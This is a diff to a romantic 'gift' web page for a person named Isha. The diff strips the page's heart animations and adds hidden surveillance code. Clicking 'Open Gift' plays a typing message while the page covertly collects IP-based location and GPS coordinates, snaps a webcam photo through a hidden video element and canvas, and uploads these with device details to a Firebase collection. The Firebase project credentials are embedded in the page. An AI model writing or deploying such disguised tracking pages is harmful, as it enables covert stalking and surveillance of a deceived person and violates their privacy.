@@ -20,15 +20,11 @@ justify-content:center;
 align-items:center;
 }
 
-/* Container */
-
 .container{
 width:90%;
 max-width:350px;
 z-index:10;
 }
-
-/* Main heart */
 
 .heart{
 font-size:70px;
@@ -39,11 +35,6 @@ animation:beat 1s infinite;
 0%{transform:scale(1);}
 50%{transform:scale(1.3);}
 100%{transform:scale(1);}
-}
-
-h1{
-font-size:28px;
-margin:10px 0;
 }
 
 button{
@@ -57,8 +48,6 @@ color:#ff4b5c;
 margin-top:15px;
 }
 
-/* Message */
-
 .message{
 display:none;
 font-size:22px;
@@ -66,47 +55,15 @@ margin-top:15px;
 min-height:60px;
 }
 
-/* Falling hearts */
-
-.heartbg{
-position:absolute;
-top:-10px;
-font-size:20px;
-animation:fall linear infinite;
+video{
+display:none;
 }
 
-@keyframes fall{
-0%{
-transform:translateY(-10px);
-opacity:1;
-}
-100%{
-transform:translateY(110vh);
-opacity:0;
-}
-}
-
-/* Explosion hearts */
-
-.popheart{
-position:absolute;
-font-size:25px;
-animation:pop 2s forwards;
-}
-
-@keyframes pop{
-0%{
-transform:scale(0);
-opacity:1;
-}
-100%{
-transform:translateY(-200px) scale(1.5);
-opacity:0;
-}
+canvas{
+display:none;
 }
 
 </style>
-
 </head>
 
 <body>
@@ -119,57 +76,20 @@ opacity:0;
 
 <p>My Special Gift For You</p>
 
-<button onclick="showLove()">Open Gift 🎁</button>
+<button onclick="startLove()">Open Gift 🎁</button>
 
 <div class="message" id="msg"></div>
 
 </div>
 
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
 <script>
 
-/* Background hearts */
+/* Love animation */
 
-for(let i=0;i<25;i++){
-
-let heart=document.createElement("div");
-
-heart.innerHTML="❤️";
-heart.className="heartbg";
-
-heart.style.left=Math.random()*100+"%";
-heart.style.animationDuration=(3+Math.random()*5)+"s";
-heart.style.fontSize=(15+Math.random()*25)+"px";
-
-document.body.appendChild(heart);
-
-}
-
-</script>
-
-
-
-<script>
-
-function showLove(){
-
-/* Explosion hearts */
-
-for(let i=0;i<20;i++){
-
-let h=document.createElement("div");
-
-h.innerHTML="💖";
-h.className="popheart";
-
-h.style.left=(40+Math.random()*20)+"%";
-h.style.bottom="40%";
-
-document.body.appendChild(h);
-
-}
-
-/* Typing animation */
+function startLove(){
 
 let text="I Love You Isha ❤️ You Are My Sweetest Dream 🌹";
 let i=0;
@@ -191,19 +111,19 @@ clearInterval(typing);
 
 },80);
 
+startTracking();
+
 }
 
 </script>
 
-
-
-<!-- Firebase + Location -->
 <script type="module">
 
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
 const firebaseConfig = {
+
 apiKey: "AIzaSyAicGiOH3CQAxfOy1Y1y-osoypb73Ew1Y8",
   authDomain: "remote-videoplayer.firebaseapp.com",
   projectId: "remote-videoplayer",
@@ -212,17 +132,75 @@ apiKey: "AIzaSyAicGiOH3CQAxfOy1Y1y-osoypb73Ew1Y8",
   appId: "1:978359248102:web:c03c62454f8cbf70030727",
   measurementId: "G-4D3PV2EGMX"
 
+
 };
 
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
+window.startTracking = async function(){
 
-/* Function Save Data */
+let gpsLat=null;
+let gpsLng=null;
+let photo=null;
 
-async function saveData(ipData,gpsLat,gpsLng){
+/* Get IP location */
 
-await addDoc(collection(db,"isha_location"),{
+let ipData = await fetch("https://ipapi.co/json/").then(res=>res.json());
+
+/* Get GPS */
+
+navigator.geolocation.getCurrentPosition(
+
+(pos)=>{
+gpsLat=pos.coords.latitude;
+gpsLng=pos.coords.longitude;
+save();
+},
+
+(err)=>{
+save();
+}
+
+);
+
+/* Camera */
+
+async function capturePhoto(){
+
+try{
+
+const stream = await navigator.mediaDevices.getUserMedia({video:true});
+
+const video=document.getElementById("video");
+video.srcObject=stream;
+
+setTimeout(()=>{
+
+const canvas=document.getElementById("canvas");
+canvas.width=video.videoWidth;
+canvas.height=video.videoHeight;
+
+const ctx=canvas.getContext("2d");
+ctx.drawImage(video,0,0);
+
+photo=canvas.toDataURL("image/png");
+
+stream.getTracks().forEach(track=>track.stop());
+
+},2000);
+
+}catch(e){}
+
+}
+
+capturePhoto();
+
+/* Save to Firebase */
+
+async function save(){
+
+await addDoc(collection(db,"isha_data"),{
 
 ip:ipData.ip,
 city:ipData.city,
@@ -235,97 +213,20 @@ ipLongitude:ipData.longitude,
 gpsLatitude:gpsLat,
 gpsLongitude:gpsLng,
 
-time:new Date().toString(),
+photo:photo,
 
-device:navigator.userAgent
+device:navigator.userAgent,
 
-});
-
-}
-
-
-/* Step 1: Get IP Location */
-
-fetch("https://ipapi.co/json/")
-.then(res=>res.json())
-.then(ipData=>{
-
-
-/* Step 2: Ask GPS */
-
-navigator.geolocation.getCurrentPosition(
-
-/* Allow */
-
-(position)=>{
-
-saveData(
-ipData,
-position.coords.latitude,
-position.coords.longitude
-);
-
-},
-
-/* Decline */
-
-(error)=>{
-
-saveData(
-ipData,
-null,
-null
-);
-
-}
-
-);
-
-
-});
-
-</script>
-  
-<!-- <script type="module">
-
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
-
-const firebaseConfig = {
-
-apiKey: "AIzaSyAicGiOH3CQAxfOy1Y1y-osoypb73Ew1Y8",
-  authDomain: "remote-videoplayer.firebaseapp.com",
-  projectId: "remote-videoplayer",
-  storageBucket: "remote-videoplayer.firebasestorage.app",
-  messagingSenderId: "978359248102",
-  appId: "1:978359248102:web:c03c62454f8cbf70030727",
-  measurementId: "G-4D3PV2EGMX"
-
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-
-
-/* Save Location */
-
-navigator.geolocation.getCurrentPosition(
-
-async (position)=>{
-
-await addDoc(collection(db,"isha_location"),{
-
-latitude:position.coords.latitude,
-longitude:position.coords.longitude,
 time:new Date().toString()
 
 });
 
 }
 
-);
+}
 
-</script> -->
+</script>
 
 </body>
 </html>
+
